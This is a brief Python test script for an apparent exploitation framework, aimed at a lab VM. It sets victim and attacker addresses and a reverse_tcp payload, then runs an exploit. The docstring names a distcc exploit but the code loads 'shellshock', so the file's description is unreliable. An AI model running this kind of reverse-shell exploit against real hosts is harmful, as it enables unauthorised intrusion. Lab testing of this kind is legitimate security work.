"""
This tests the distcc exploit on a vulnerable server (VM running on host)
"""
from core.core import Core

victim_ip = "10.10.10.3"
victim_port = "3632"
attacker_ip = "10.10.12.83"
attacker_port = "4444"
payload = "reverse_tcp"

test_core = Core()
test_core.new_session()
test_core.load_exploit("shellshock")
test_core.active_session.set_exploit_field(["victim_ip", victim_ip])
test_core.active_session.set_exploit_field(["victim_port", victim_port])
test_core.active_session.set_exploit_field(["attacker_ip", attacker_ip])
test_core.active_session.set_exploit_field(["attacker_port", attacker_port])
test_core.active_session.set_exploit_field(["payload", payload])
test_core.active_session.run_exploit()